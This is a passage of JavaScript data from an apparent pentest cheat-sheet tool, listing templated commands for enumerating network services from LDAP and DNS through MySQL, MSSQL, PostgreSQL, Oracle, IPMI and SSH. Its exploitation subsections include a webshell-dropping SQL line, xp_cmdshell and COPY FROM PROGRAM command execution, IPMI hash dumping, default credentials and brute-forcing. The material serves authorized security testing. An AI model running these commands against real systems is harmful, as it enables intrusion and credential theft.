          { id: 'fldap1', label: 'Anonymous LDAP dump', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -b "DC=$$DOMAIN,DC=local" "(objectClass=*)"', notes: 'Works if null session is allowed.' },
          { id: 'fldap2', label: 'Authenticated user list', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -D "$$USER@$$DOMAIN" -w $$PASSWORD -b "DC=$$DOMAIN,DC=local" "(objectClass=user)" sAMAccountName', notes: '' },
          { id: 'fldap3', label: 'nxc LDAP enum', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --users', notes: 'Enumerate domain users via LDAP.' },
          { id: 'fldap4', label: 'BloodHound collection', os: 'Linux', command: 'bloodhound-python -u $$USER -p $$PASSWORD -d $$DOMAIN -dc $$DC -c all', notes: 'Collects all BloodHound data remotely.' },
          { id: 'fldap5', label: 'Nmap LDAP scripts', os: 'Linux', command: 'nmap -sV -sC -p 389,636 $$IP', notes: 'Detect LDAP version and check anonymous bind.' },
        ],
      },
      {
        id: 'fp-nfs',
        name: 'NFS (Port 2049)',
        description: 'Enumerate and mount NFS exports to access files on the target.',
        tags: ['nfs', 'linux', 'enumeration'],
        commands: [
          { id: 'nfs1', label: 'Nmap NFS scripts', os: 'Linux', command: 'nmap -sV -sC -p 111,2049 $$IP', notes: '' },
          { id: 'nfs2', label: 'Show NFS exports', os: 'Linux', command: 'showmount -e $$IP', notes: 'Lists all exported directories and allowed clients.' },
          { id: 'nfs3', label: 'Mount NFS share', os: 'Linux', command: 'sudo mount -t nfs $$IP:/<export> /mnt/nfs -nolock', notes: 'Mount exported share locally.' },
          { id: 'nfs4', label: 'NSE NFS scripts', os: 'Linux', command: 'nmap --script nfs* -p 111,2049 $$IP', notes: 'nfs-ls, nfs-showmount, nfs-statfs.' },
          { id: 'nfs5', label: 'Unmount', os: 'Linux', command: 'sudo umount /mnt/nfs', notes: '' },
        ],
      },
      {
        id: 'fp-dns',
        name: 'DNS (Port 53)',
        description: 'Enumerate DNS: record types, zone transfers, subdomain brute-forcing.',
        tags: ['dns', 'enumeration', 'network'],
                subtechniques: [
          {
            id: "dns-whois",
            name: "Whois & Infrastructure",
            commands: [
            { id: "dns-w1", label: "whois domain", os: "Linux", command: "whois $$DOMAIN", notes: "Registrar, registration dates, nameservers, and contact info." },
            { id: "dns-w2", label: "whois IP", os: "Linux", command: "whois $$IP", notes: "ASN, CIDR block, and organization for the IP address." },
            { id: "dns-w3", label: "NS records", os: "Linux", command: "dig NS $$DOMAIN", notes: "Identify authoritative nameservers — needed for zone transfer attempts." },
            { id: "dns-w4", label: "SOA record", os: "Linux", command: "dig SOA $$DOMAIN", notes: "Start of Authority — primary NS, admin email, serial, and TTL values." }
            ]
          },
          {
            id: "dns-basic",
            name: "Record Queries",
            commands: [
            { id: "dns1", label: "A record (dig)", os: "Linux", command: "dig A $$DOMAIN", notes: "Resolves domain to IPv4 address." },
            { id: "dns-b1", label: "AAAA record", os: "Linux", command: "dig AAAA $$DOMAIN", notes: "IPv6 address record." },
            { id: "dns2", label: "MX records", os: "Linux", command: "dig MX $$DOMAIN", notes: "Mail exchange servers — useful for phishing scope and email infra." },
            { id: "dns-b2", label: "TXT records", os: "Linux", command: "dig TXT $$DOMAIN", notes: "SPF, DKIM, DMARC, verification tokens, and sometimes internal info." },
            { id: "dns3", label: "Any record (all types)", os: "Linux", command: "dig ANY $$DOMAIN @$$IP", notes: "Query all record types from a specific nameserver." },
            { id: "dns-b3", label: "nslookup A record", os: "Both", command: "nslookup $$DOMAIN", notes: "Simple resolution check — works on Windows too." },
            { id: "dns-b4", label: "nslookup MX", os: "Both", command: "nslookup -type=MX $$DOMAIN", notes: "" },
            { id: "dns-b5", label: "host A record", os: "Linux", command: "host $$DOMAIN", notes: "Lightweight — shows A, AAAA, and MX quickly." },
            { id: "dns-b6", label: "Reverse PTR (dig)", os: "Linux", command: "dig -x $$IP", notes: "Reverse DNS lookup — reveals hostname for an IP." }
            ]
          },
          {
            id: "dns-zone",
            name: "Zone Transfer",
            commands: [
            { id: "dns4", label: "Zone transfer (dig)", os: "Linux", command: "dig axfr $$DOMAIN @$$IP", notes: "Attempt a full zone transfer from the nameserver. Reveals all DNS records if misconfigured." },
            { id: "dns5", label: "Zone transfer (nslookup)", os: "Both", command: "nslookup -type=any -query=AXFR $$DOMAIN $$IP", notes: "" },
            { id: "dns-z1", label: "dnsrecon zone transfer", os: "Linux", command: "dnsrecon -d $$DOMAIN -t axfr", notes: "Automated zone transfer attempt with dnsrecon." }
            ]
          },
          {
            id: "dns-osint",
            name: "OSINT & Brute Force",
            commands: [
            { id: "dns6", label: "dnsenum full enum", os: "Linux", command: "dnsenum --dnsserver $$IP --enum -p 0 -s 0 -o subdomains.txt -f $$WORDLIST $$DOMAIN", notes: "Zone transfer + brute force + Google scraping in one command." },
            { id: "dns7", label: "dnsrecon brute", os: "Linux", command: "dnsrecon -d $$DOMAIN -D $$WORDLIST -t brt", notes: "Brute force subdomains with a wordlist." },
            { id: "dns-o1", label: "fierce subdomain search", os: "Linux", command: "fierce --domain $$DOMAIN --wordlist $$WORDLIST", notes: "Recursive search with wildcard detection. Finds hidden subdomains not in DNS." },
            { id: "dns-o2", label: "theHarvester", os: "Linux", command: "theHarvester -d $$DOMAIN -b google,bing,hackertarget,dnsdumpster -l 500", notes: "Collects emails, subdomains, and IPs from public sources. No direct target interaction." }
            ]
          }
        ],
      },
      {
        id: 'fp-subdomain',
        name: 'Subdomain Enumeration',
        description: 'Discover subdomains via active brute force and passive OSINT — CT logs, theHarvester, and search engines.',
        tags: ['dns', 'subdomain', 'osint', 'recon'],
        subtechniques: [
          {
            id: 'fpsub-active',
            name: 'Active Enumeration',
            commands: [
            { id: 'fpsub1', label: 'Zone transfer (dig)', os: 'Linux', command: 'dig axfr $$DOMAIN @$$IP', notes: 'Reveals all DNS records if the nameserver is misconfigured. Rarely works today but always worth attempting.' },
            { id: 'fpsub2', label: 'dnsenum brute force', os: 'Linux', command: 'dnsenum --dnsserver $$IP --enum -p 0 -s 0 -o subdomains.txt -f $$WORDLIST $$DOMAIN', notes: 'Attempts zone transfer and brute forces subdomains from wordlist.' },
            { id: 'fpsub3', label: 'gobuster DNS', os: 'Linux', command: 'gobuster dns -d $$DOMAIN -w $$WORDLIST -t 50', notes: 'Fast DNS subdomain brute force.' },
            { id: 'fpsub4', label: 'fierce recursive', os: 'Linux', command: 'fierce --domain $$DOMAIN --wordlist $$WORDLIST', notes: 'Recursive search with wildcard detection. Finds subdomains not resolvable via brute force.' },
            { id: 'fpsub5', label: 'dnsrecon brute', os: 'Linux', command: 'dnsrecon -d $$DOMAIN -D $$WORDLIST -t brt', notes: 'Brute forces subdomains and outputs detailed DNS records.' },
            { id: 'fpsub6', label: 'ffuf subdomain fuzz', os: 'Linux', command: 'ffuf -w $$WORDLIST:FUZZ -u http://FUZZ.$$DOMAIN -fs 0', notes: 'HTTP-based subdomain discovery. Filter common response size with -fs.' }
            ]
          },
          {
            id: 'fpsub-passive',
            name: 'Passive Enumeration',
            commands: [
            { id: 'fpsub7', label: 'crt.sh all subdomains', os: 'Linux', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq -r \'.[].name_value\' | sort -u', notes: 'Certificate Transparency logs — no direct target interaction. Certificates often list dev/api/mail subdomains.' },
            { id: 'fpsub8', label: 'crt.sh filter keyword', os: 'Linux', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq -r \'.[] | select(.name_value | contains("dev")) | .name_value\' | sort -u', notes: 'Filter CT results to subdomains containing a keyword (dev, api, admin, staging).' },
            { id: 'fpsub9', label: 'crt.sh save to file', os: 'Linux', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq -r \'.[].name_value\' | sort -u > subdomains.txt', notes: 'Save all discovered subdomains to a file for further processing.' },
            { id: 'fpsub10', label: 'theHarvester OSINT', os: 'Linux', command: 'theHarvester -d $$DOMAIN -b google,bing,hackertarget,dnsdumpster -l 500', notes: 'Collects emails, subdomains, and IPs from search engines and public databases.' },
            { id: 'fpsub11', label: 'theHarvester all sources', os: 'Linux', command: 'theHarvester -d $$DOMAIN -b all -l 500 -f results.json', notes: 'Aggregate results from all configured passive sources into a JSON report.' },
            { id: 'fpsub12', label: 'Google dork subdomains', os: 'Both', command: 'site:$$DOMAIN', notes: 'Paste into Google — finds all indexed subdomains and public-facing assets.' }
            ]
          }
        ],
      },
      {
        id: 'fp-smtp',
        name: 'SMTP (Port 25/587/465)',
        description: 'Enumerate SMTP: banner, supported commands, user enumeration via VRFY/EXPN/RCPT.',
        tags: ['smtp', 'email', 'enumeration'],
                subtechniques: [
          {
            id: "smtp-disc",
            name: "Recon & Banner",
            commands: [
            { id: "smtp1", label: "Nmap SMTP scripts", os: "Linux", command: "nmap -sV -sC -p 25,587,465 $$IP", notes: "" },
            { id: "smtp2", label: "Banner grab + EHLO", os: "Linux", command: "telnet $$IP 25\nEHLO pentest", notes: "See supported extensions and server identity." }
            ]
          },
          {
            id: "smtp-usr",
            name: "User Enum & Relay",
            commands: [
            { id: "smtp3", label: "User enum (VRFY)", os: "Linux", command: "smtp-user-enum -M VRFY -U $$WORDLIST -t $$IP", notes: "VRFY checks if a user exists." },
            { id: "smtp4", label: "User enum (RCPT TO)", os: "Linux", command: "smtp-user-enum -M RCPT -U users.txt -D $$DOMAIN -t $$IP", notes: "RCPT TO based user enumeration." },
            { id: "smtp5", label: "EXPN command", os: "Linux", command: "telnet $$IP 25\nEXPN all", notes: "Expand mailing lists — may reveal valid users." },
            { id: "smtp6", label: "Open relay test", os: "Linux", command: "nmap --script smtp-open-relay -p 25 $$IP", notes: "Check if server can relay mail to external domains." },
            { id: "smtp7", label: "Send test email", os: "Linux", command: "swaks --to target@$$DOMAIN --from attacker@evil.com --server $$IP", notes: "Test if relay is open via swaks." }
            ]
          }
        ],
      },
      {
        id: 'fp-imap',
        name: 'IMAP / POP3 (Ports 143/110/993/995)',
        description: 'Enumerate IMAP/POP3: banner, capabilities, authentication, and mailbox listing.',
        tags: ['imap', 'pop3', 'email', 'enumeration'],
                subtechniques: [
          {
            id: "imap-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "imap1", label: "Nmap IMAP/POP3 scripts", os: "Linux", command: "nmap -sV -sC -p 110,143,993,995 $$IP", notes: "" },
            { id: "imap2", label: "Banner grab IMAP (nc)", os: "Linux", command: "nc -nv $$IP 143", notes: "See server greeting and version." },
            { id: "imap3", label: "IMAP capabilities", os: "Linux", command: "curl -k \"imap://$$IP\" --user \"$$USER:$$PASSWORD\" -v 2>&1 | head -20", notes: "" }
            ]
          },
          {
            id: "imap-mail",
            name: "Mail Access",
            commands: [
            { id: "imap4", label: "List IMAP mailboxes", os: "Linux", command: "curl -k \"imap://$$IP\" --user \"$$USER:$$PASSWORD\" --request \"LIST \"\" \"*\"\" -v", notes: "List all mailboxes for the user." },
            { id: "imap5", label: "Fetch email (IMAP)", os: "Linux", command: "curl -k \"imap://$$IP/INBOX;MAILINDEX=1\" --user \"$$USER:$$PASSWORD\"", notes: "Download first message from INBOX." },
            { id: "imap6", label: "POP3 login + list", os: "Linux", command: "telnet $$IP 110\nUSER $$USER\nPASS $$PASSWORD\nLIST", notes: "List messages via POP3." },
            { id: "imap7", label: "SSL IMAP (openssl)", os: "Linux", command: "openssl s_client -connect $$IP:993", notes: "Connect to IMAPS port." }
            ]
          }
        ],
      },
      {
        id: 'fp-snmp',
        name: 'SNMP (Port 161 UDP)',
        description: 'Enumerate SNMP community strings and MIB data: users, processes, network interfaces, installed software.',
        tags: ['snmp', 'udp', 'enumeration', 'network'],
                subtechniques: [
          {
            id: "snmp-scan",
            name: "Scan & Walk",
            commands: [
            { id: "snmp1", label: "Nmap SNMP scripts", os: "Linux", command: "nmap -sU -sV -p 161 $$IP --script snmp*", notes: "UDP scan — requires root." },
            { id: "snmp2", label: "Community string brute (onesixtyone)", os: "Linux", command: "onesixtyone -c $$WORDLIST $$IP", notes: "Brute-force community strings." },
            { id: "snmp3", label: "Full MIB walk (snmpwalk)", os: "Linux", command: "snmpwalk -v2c -c public $$IP", notes: "Dump entire MIB tree with \"public\" community." },
            { id: "snmp4", label: "System info OID", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.1", notes: "sysDescr, sysUpTime, sysContact, sysName." }
            ]
          },
          {
            id: "snmp-enum",
            name: "Detailed Enumeration",
            commands: [
            { id: "snmp5", label: "Enumerate users (Windows)", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.4.1.77.1.2.25", notes: "Windows user accounts via SNMP." },
            { id: "snmp6", label: "Enumerate processes", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.25.4.2.1.2", notes: "Running processes on the target." },
            { id: "snmp7", label: "Enumerate open TCP ports", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.6.13.1.3", notes: "Open TCP connections via SNMP." },
            { id: "snmp8", label: "Installed software", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.25.6.3.1.2", notes: "Installed programs list (Windows)." },
            { id: "snmp9", label: "braa (bulk walk)", os: "Linux", command: "braa public@$$IP:.1.3.6.*", notes: "Fast bulk SNMP walk." }
            ]
          }
        ],
      },
      {
        id: 'fp-mysql',
        name: 'MySQL (Port 3306)',
        description: 'Fingerprint and enumerate MySQL: version, users, databases, tables, columns, and file read/write capabilities.',
        tags: ['mysql', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "mysql-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "mysql1", label: "Nmap MySQL scripts", os: "Linux", command: "nmap -sV -sC -p 3306 $$IP --script mysql*", notes: "Detects version, auth methods, empty root password, databases." },
            { id: "mysql2", label: "Banner grab (nc)", os: "Linux", command: "nc -nv $$IP 3306", notes: "Grab raw MySQL banner — shows version and capabilities." },
            { id: "mysql3", label: "Connect (authenticated)", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD", notes: "Password immediately after -p (no space)." },
            { id: "mysql4", label: "Anonymous / empty root check", os: "Linux", command: "mysql -h $$IP -u root --password=\"\" -e \"SELECT user,host FROM mysql.user;\"\nmysql -h $$IP -u \"\" --password=\"\" -e \"SHOW DATABASES;\"", notes: "Common misconfiguration — root with no password." }
            ]
          },
          {
            id: "mysql-enum",
            name: "Enumeration",
            commands: [
            { id: "mysql5", label: "Version & current context", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT version(), user(), database(), @@datadir;\"", notes: "" },
            { id: "mysql6", label: "List databases", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SHOW DATABASES;\"", notes: "" },
            { id: "mysql7", label: "List tables", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"USE $$DB_NAME; SHOW TABLES;\"", notes: "" },
            { id: "mysql8", label: "Describe table columns", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"DESCRIBE $$DB_NAME.$$DB_TABLE;\"", notes: "Shows column names, types, and keys." }
            ]
          },
          {
            id: "mysql-exp",
            name: "Exploitation",
            commands: [
            { id: "mysql9", label: "Dump user hashes", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT user,host,authentication_string FROM mysql.user;\"", notes: "Requires access to mysql.user — crack hashes with hashcat mode 3200." },
            { id: "mysql10", label: "Check file privileges", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE';\"", notes: "FILE privilege required for LOAD_FILE and SELECT INTO OUTFILE." },
            { id: "mysql11", label: "Read file (LOAD_FILE)", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT LOAD_FILE('/etc/passwd');\"", notes: "Requires FILE privilege and file must be world-readable." },
            { id: "mysql12", label: "Write file (INTO OUTFILE)", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT '<?php system(\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"", notes: "Requires FILE privilege and write access to web root. Drops a webshell." },
            { id: "mysql13", label: "Brute force (hydra)", os: "Linux", command: "hydra -L users.txt -P $$WORDLIST $$IP mysql", notes: "" },
            { id: "mysql14", label: "Nmap brute", os: "Linux", command: "nmap -p 3306 $$IP --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'fp-mssql',
        name: 'MSSQL (Port 1433)',
        description: 'Fingerprint and enumerate Microsoft SQL Server: version, databases, tables, linked servers, and xp_cmdshell status.',
        tags: ['mssql', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "mssql-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "mssql1", label: "Nmap MSSQL scripts", os: "Linux", command: "nmap -sV -sC -p 1433 $$IP --script ms-sql*", notes: "ms-sql-info, ms-sql-config, ms-sql-empty-password, ms-sql-ntlm-info." },
            { id: "mssql2", label: "Connect (mssqlclient.py)", os: "Linux", command: "mssqlclient.py $$USER:$$PASSWORD@$$IP\nmssqlclient.py $$DOMAIN/$$USER:$$PASSWORD@$$IP -windows-auth", notes: "Second form uses Windows/AD authentication instead of SQL auth." },
            { id: "mssql3", label: "Connect (sqsh / sqlcmd)", os: "Linux", command: "sqsh -S $$IP -U $$USER -P $$PASSWORD\nsqlcmd -S $$IP -U $$USER -P $$PASSWORD -Q \"SELECT @@VERSION\"", notes: "sqsh = Linux MSSQL client. sqlcmd = Windows built-in client." },
            { id: "mssql4", label: "Version & server info", os: "Both", command: "SELECT @@VERSION\nSELECT SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('Edition'), @@SERVICENAME", notes: "" },
            { id: "mssql5", label: "List databases", os: "Both", command: "SELECT name,create_date,state_desc FROM sys.databases\nSELECT name FROM master..sysdatabases", notes: "" }
            ]
          },
          {
            id: "mssql-enum",
            name: "Enumeration",
            commands: [
            { id: "mssql6", label: "List tables in DB", os: "Both", command: "SELECT TABLE_NAME FROM $$DB_NAME.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'\nSELECT name FROM $$DB_NAME..sysobjects WHERE xtype='U'", notes: "" },
            { id: "mssql7", label: "List columns in table", os: "Both", command: "SELECT COLUMN_NAME,DATA_TYPE FROM $$DB_NAME.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='$$DB_TABLE'\nSELECT name,TYPE_NAME(system_type_id) FROM $$DB_NAME..syscolumns WHERE id=OBJECT_ID('$$DB_NAME..$$DB_TABLE')", notes: "" },
            { id: "mssql8", label: "Check current user & role", os: "Both", command: "SELECT SYSTEM_USER, USER_NAME()\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT IS_SRVROLEMEMBER('bulkadmin')", notes: "1 = member of that role. sysadmin = full control." },
            { id: "mssql9", label: "List DB users & roles", os: "Both", command: "SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE type IN ('S','U','G')\nEXEC sp_helplogins", notes: "" },
            { id: "mssql10", label: "Check xp_cmdshell status", os: "Both", command: "SELECT value FROM sys.configurations WHERE name='xp_cmdshell'\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell'", notes: "value=1 = already enabled. Requires sysadmin to enable." }
            ]
          },
          {
            id: "mssql-exp",
            name: "Exploitation",
            commands: [
            { id: "mssql11", label: "Enable & run xp_cmdshell", os: "Both", command: "EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami'", notes: "Requires sysadmin. Use via mssqlclient.py enable_xp_cmdshell → xp_cmdshell whoami." },
            { id: "mssql12", label: "Read file (OPENROWSET)", os: "Both", command: "SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS contents\nSELECT BulkColumn FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_BLOB) x", notes: "Requires ADMINISTER BULK OPERATIONS or sysadmin." },
            { id: "mssql13", label: "List linked servers", os: "Both", command: "SELECT name,data_source,provider FROM sys.servers WHERE is_linked=1\nEXEC sp_linkedservers\nSELECT * FROM OPENQUERY(\"<linked-server>\", 'SELECT SYSTEM_USER')", notes: "Linked servers may have higher privileges — pivot via OPENQUERY or EXEC AT." },
            { id: "mssql14", label: "Brute force (hydra)", os: "Linux", command: "hydra -L users.txt -P passwords.txt $$IP mssql", notes: "" },
            { id: "mssql15", label: "Nmap MSSQL brute", os: "Linux", command: "nmap -p 1433 $$IP --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'fp-postgres',
        name: 'PostgreSQL (Port 5432)',
        description: 'Fingerprint and enumerate PostgreSQL: version, databases, schemas, tables, user roles, and file read/RCE via COPY.',
        tags: ['postgresql', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "pg-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "pg1", label: "Nmap PostgreSQL scripts", os: "Linux", command: "nmap -sV -sC -p 5432 $$IP --script pgsql*", notes: "" },
            { id: "pg2", label: "Connect (psql)", os: "Linux", command: "psql -h $$IP -U $$USER -d $$DB_NAME\npsql -h $$IP -U postgres", notes: "Default admin user = postgres. Default DB = postgres." },
            { id: "pg3", label: "Version & current context", os: "Both", command: "SELECT version();\nSELECT current_user, session_user, current_database();\nSELECT inet_server_addr(), inet_server_port();", notes: "" },
            { id: "pg4", label: "List databases", os: "Both", command: "SELECT datname FROM pg_database;\n\\l", notes: "\\l is the psql meta-command shortcut." }
            ]
          },
          {
            id: "pg-enum",
            name: "Enumeration",
            commands: [
            { id: "pg5", label: "List tables (current schema)", os: "Both", command: "SELECT table_name FROM information_schema.tables WHERE table_schema='public';\n\\dt", notes: "" },
            { id: "pg6", label: "Describe table columns", os: "Both", command: "SELECT column_name,data_type FROM information_schema.columns WHERE table_name='$$DB_TABLE';\n\\d $$DB_TABLE", notes: "" },
            { id: "pg7", label: "List users & roles", os: "Both", command: "SELECT rolname,rolsuper,rolcreatedb,rolcreaterole,rolcanlogin FROM pg_roles;\n\\du", notes: "rolsuper=t = superuser (equivalent to root)." },
            { id: "pg8", label: "Check superuser status", os: "Both", command: "SELECT current_user, (SELECT rolsuper FROM pg_roles WHERE rolname=current_user);\nSELECT pg_has_role(current_user,'pg_execute_server_program','MEMBER');", notes: "pg_execute_server_program role allows COPY FROM PROGRAM (RCE)." }
            ]
          },
          {
            id: "pg-exp",
            name: "Exploitation",
            commands: [
            { id: "pg9", label: "Read file (COPY TO STDOUT)", os: "Both", command: "COPY (SELECT '') TO PROGRAM 'cat /etc/passwd';\nCREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;", notes: "COPY FROM reads file into a temp table. Requires superuser or pg_read_server_files role." },
            { id: "pg10", label: "RCE via COPY FROM PROGRAM", os: "Both", command: "COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';\nCREATE TABLE cmd_output(output TEXT);\nCOPY cmd_output FROM PROGRAM 'id';\nSELECT * FROM cmd_output;", notes: "CVE-2019-9193 (PostgreSQL ≥9.3). Requires superuser or pg_execute_server_program role." },
            { id: "pg11", label: "UDF-based RCE", os: "Linux", command: "# 1. Compile PostgreSQL UDF shared library\ngcc -shared -fPIC -o udf.so udf.c -I$(pg_config --includedir-server)\n# 2. Load via COPY and CREATE FUNCTION\nCOPY udf_binary TO '/tmp/udf.so';\nCREATE FUNCTION sys_exec(text) RETURNS text AS '/tmp/udf.so','sys_exec' LANGUAGE C;", notes: "For restricted PostgreSQL — drop a custom shared library as a UDF." },
            { id: "pg12", label: "Brute force (hydra)", os: "Linux", command: "hydra -L users.txt -P passwords.txt $$IP postgres", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'fp-oracle',
        name: 'Oracle TNS (Port 1521)',
        description: 'Enumerate Oracle database service: SID brute-forcing, user enumeration, and code execution via ODAT.',
        tags: ['oracle', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "ora-disc",
            name: "Discovery & Brute",
            commands: [
            { id: "ora1", label: "Nmap Oracle scripts", os: "Linux", command: "nmap -sV -sC -p 1521 $$IP --script oracle*", notes: "" },
            { id: "ora2", label: "SID brute (odat)", os: "Linux", command: "odat sidguesser -s $$IP -p 1521", notes: "Brute-force Oracle SID names." },
            { id: "ora3", label: "Password brute (odat)", os: "Linux", command: "odat passwordguesser -s $$IP -p 1521 -d <SID> --accounts-file accounts.txt", notes: "" },
            { id: "ora4", label: "All ODAT checks", os: "Linux", command: "odat all -s $$IP -p 1521 -d <SID> -U $$USER -P $$PASSWORD", notes: "Run all ODAT enumeration and exploitation modules." }
            ]
          },
          {
            id: "ora-acc",
            name: "Access & Enum",
            commands: [
            { id: "ora5", label: "SQLPlus login", os: "Linux", command: "sqlplus $$USER/$$PASSWORD@$$IP/XE", notes: "Connect via Oracle SQLPlus client. XE = SID." },
            { id: "ora6", label: "List users", os: "Linux", command: "sqlplus $$USER/$$PASSWORD@$$IP/XE\nSELECT username FROM all_users ORDER BY username;", notes: "" },
            { id: "ora7", label: "File upload (odat utlfile)", os: "Linux", command: "odat utlfile -s $$IP -d <SID> -U $$USER -P $$PASSWORD --putFile /tmp shell.exe shell.exe", notes: "Upload file to server via UTL_FILE." }
            ]
          }
        ],
      },
      {
        id: 'fp-ipmi',
        name: 'IPMI (Port 623 UDP)',
        description: 'Enumerate IPMI/BMC: version, authentication bypass, and credential extraction.',
        tags: ['ipmi', 'bmc', 'udp', 'enumeration'],
                subtechniques: [
          {
            id: "ipmi-scan",
            name: "Discovery & Scan",
            commands: [
            { id: "ipmi1", label: "Nmap IPMI scan", os: "Linux", command: "nmap -sU --script ipmi-version -p 623 $$IP", notes: "Detect IPMI and get version info." },
            { id: "ipmi2", label: "ipmitool version", os: "Linux", command: "ipmitool -I lanplus -H $$IP -U \"\" -P \"\" mc info", notes: "Get BMC info — may work without creds." }
            ]
          },
          {
            id: "ipmi-hash",
            name: "Hash Extraction & Attack",
            commands: [
            { id: "ipmi3", label: "IPMI hash dump (Metasploit)", os: "Linux", command: "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $$IP; run\"", notes: "Dumps HMAC-SHA1 hashes — crack offline for plain text." },
            { id: "ipmi4", label: "Crack IPMI hash", os: "Linux", command: "hashcat -m 7300 ipmi.txt $$WORDLIST", notes: "Mode 7300 = IPMI2 RAKP HMAC-SHA1." },
            { id: "ipmi5", label: "IPMI default creds", os: "Linux", command: "ipmitool -I lanplus -H $$IP -U admin -P admin chassis status", notes: "Try vendor defaults: admin/admin, admin/password, root/calvin (Dell)." },
            { id: "ipmi6", label: "IPMI cipher zero bypass", os: "Linux", command: "ipmitool -I lanplus -H $$IP -U $$USER -P \"\" -C 0 mc info", notes: "Cipher 0 = no auth. Many older BMCs accept it." }
            ]
          }
        ],
      },
      {
        id: 'fp-win-remote',
        name: 'Windows Remote Management',
        description: 'Enumerate Windows remote management protocols: RDP, WinRM, WMI, and RPC.',
        tags: ['windows', 'rdp', 'winrm', 'wmi', 'enumeration'],
                subtechniques: [
          {
            id: "wrm-rdp",
            name: "RDP & WinRM",
            commands: [
            { id: "wrm1", label: "Nmap RDP scripts", os: "Linux", command: "nmap -sV -sC -p 3389 $$IP --script rdp*", notes: "" },
            { id: "wrm2", label: "RDP NLA check", os: "Linux", command: "nmap --script rdp-enum-encryption -p 3389 $$IP", notes: "Check if NLA is required." },
            { id: "wrm3", label: "WinRM check (CME)", os: "Linux", command: "crackmapexec winrm $$IP -u $$USER -p $$PASSWORD", notes: "Verify WinRM access (port 5985/5986)." },
            { id: "wrm4", label: "WMI query (wmiexec)", os: "Linux", command: "wmiexec.py $$DOMAIN/$$USER:$$PASSWORD@$$IP \"hostname\"", notes: "" }
            ]
          },
          {
            id: "wrm-rpc",
            name: "RPC & WMI",
            commands: [
            { id: "wrm5", label: "RPC enumeration", os: "Linux", command: "rpcclient -U \"$$USER%$$PASSWORD\" $$IP", notes: "Interactive RPC client for AD/SMB enumeration." },
            { id: "wrm6", label: "RPC enumdomusers", os: "Linux", command: "rpcclient -U \"\" $$IP -c \"enumdomusers\" -N", notes: "Anonymous user enumeration via RPC." },
            { id: "wrm7", label: "Nmap WinRM", os: "Linux", command: "nmap -sV -p 5985,5986 $$IP", notes: "Detect WinRM (HTTP=5985, HTTPS=5986)." }
            ]
          }
        ],
      },
      {
        id: 'fp-linux-remote',
        name: 'Linux Remote Management',
        description: 'Enumerate Linux remote management: SSH, Rsync, and legacy R-services (rlogin/rsh/rexec).',
        tags: ['linux', 'ssh', 'rsync', 'enumeration'],
                subtechniques: [
          {
            id: "lrm-ssh",
            name: "SSH",
            commands: [
            { id: "lrm1", label: "Nmap SSH scripts", os: "Linux", command: "nmap -sV -sC -p 22 $$IP --script ssh*", notes: "Banner, host-key, auth methods." },
            { id: "lrm2", label: "SSH auth methods", os: "Linux", command: "ssh -v $$USER@$$IP 2>&1 | grep \"Authentications that can continue\"", notes: "Which methods does the server allow?" },
            { id: "lrm3", label: "SSH public key audit", os: "Linux", command: "ssh-audit $$IP", notes: "Check for weak ciphers, kex algorithms, host key types." },
            { id: "lrm4", label: "SSH brute (hydra)", os: "Linux", command: "hydra -l $$USER -P $$WORDLIST ssh://$$IP", notes: "" }
            ]
          },
          {
            id: "lrm-rsync",
            name: "Rsync",
            commands: [
